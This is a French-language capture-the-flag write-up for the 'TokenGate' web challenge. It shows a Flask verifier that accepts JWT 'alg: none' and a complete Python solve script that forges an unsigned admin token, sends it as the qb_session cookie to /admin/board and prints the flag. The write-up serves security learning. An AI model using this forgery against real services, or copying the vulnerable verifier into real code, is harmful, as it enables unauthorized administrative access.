# TokenGate — Writeup

## Énoncé (HTL)

- **Titre :** TokenGate
- **Catégorie :** webex
- **Points :** 100
- **Solves :** 110
- **Connexion :** `http://web.ctf.yogosha.com:8005`

> QuickBoard is a tiny kanban app. Sign in with any username and password and you
> get a session cookie. Members see their own board, and the staff backlog at
> `/admin/board` is supposed to be off limits. Your account is a plain member.
> Talk the staff backlog into handing you its internal access token.

## Protections / modèle

- Appli Flask (`app.py`). La session est un **JWT maison** stocké dans le cookie
  `qb_session`, signé en HS256 avec une clé serveur.
- `/login` fabrique toujours un token `{"sub": <user>, "role": "user"}`.
- `/admin/board` exige `role == "admin"` sinon `403`, et affiche le flag si l'accès
  passe.
- On ne connaît pas la clé de signature : impossible de forger un HS256 valide…
  en théorie.

## Vulnérabilité : JWT `alg: none`

Le vérificateur accepte l'algorithme `none` et renvoie le payload **sans aucune
vérification de signature** (`app.py`) :

```python
def verify_token(token: str) -> dict | None:
    parts = token.split(".")
    if len(parts) != 3:          # il faut quand même 3 parties
        return None
    ...
    alg = header.get("alg")
    if alg == "none":
        return payload           # <-- aucune vérif, le payload est cru tel quel
```

Il suffit donc de fabriquer un token dont l'en-tête annonce `alg: none`, avec le
payload de notre choix (`role: admin`) et une 3ᵉ partie (signature) **vide**. Le
`split(".")` exige 3 segments : `header.payload.` convient (le dernier est vide).

## Résolution pas à pas

1. On encode chaque partie en base64url **sans padding** (comme le fait le serveur) :

```python
import base64, json
b64url = lambda raw: base64.urlsafe_b64encode(raw).rstrip(b"=").decode()
```

2. En-tête avec `alg none`, et payload qui nous passe `admin` :

```python
header  = {"alg": "none", "typ": "JWT"}
payload = {"sub": "pirate", "role": "admin"}
```

3. On assemble `header.payload.` (signature vide = 3 parties) :

```python
token = (b64url(json.dumps(header,  separators=(",", ":")).encode()) + "." +
         b64url(json.dumps(payload, separators=(",", ":")).encode()) + ".")
```

4. On appelle `/admin/board` avec le cookie `qb_session` et on lit le flag :

```python
import urllib.request, re
req  = urllib.request.Request(base + "/admin/board",
                              headers={"Cookie": f"qb_session={token}"})
html = urllib.request.urlopen(req, timeout=10).read().decode()
print(re.search(r"HTL\{[^}]*\}", html).group(0))
```

## Script complet -> Script intégral

```python
#!/usr/bin/env python3
# Usage: python3 solve.py <host> <port>
#        python3 solve.py web.ctf.yogosha.com 8005
import sys, json, base64, re, urllib.request

host = sys.argv[1] if len(sys.argv) > 1 else "web.ctf.yogosha.com"
port = sys.argv[2] if len(sys.argv) > 2 else "8005"
base = f"http://{host}:{port}"

def b64url(raw: bytes) -> str:
    # base64url sans padding, comme le serveur
    return base64.urlsafe_b64encode(raw).rstrip(b"=").decode()

# JWT alg=none : verify_token() renvoie le payload SANS vérifier la signature.
header  = {"alg": "none", "typ": "JWT"}
payload = {"sub": "pirate", "role": "admin"}      # on se déclare admin
token = (b64url(json.dumps(header,  separators=(",", ":")).encode()) + "." +
         b64url(json.dumps(payload, separators=(",", ":")).encode()) + ".")
# 3e partie (signature) volontairement vide -> token = "header.payload."

req  = urllib.request.Request(base + "/admin/board",
                              headers={"Cookie": f"qb_session={token}"})
html = urllib.request.urlopen(req, timeout=10).read().decode()

m = re.search(r"HTL\{[^}]*\}", html)
print("[*] Token :", token)
print("[+] Flag  :", m.group(0) if m else "(non trouvé)\n" + html)
```

## Flag

```
HTL{alg_none_means_no_trust}
```

*(Testé en local — l'appli fournie renvoie le flag de dev `HTL{dev_default_tokengate}` —
puis sur l'instance HTL qui renvoie le flag ci-dessus.)*
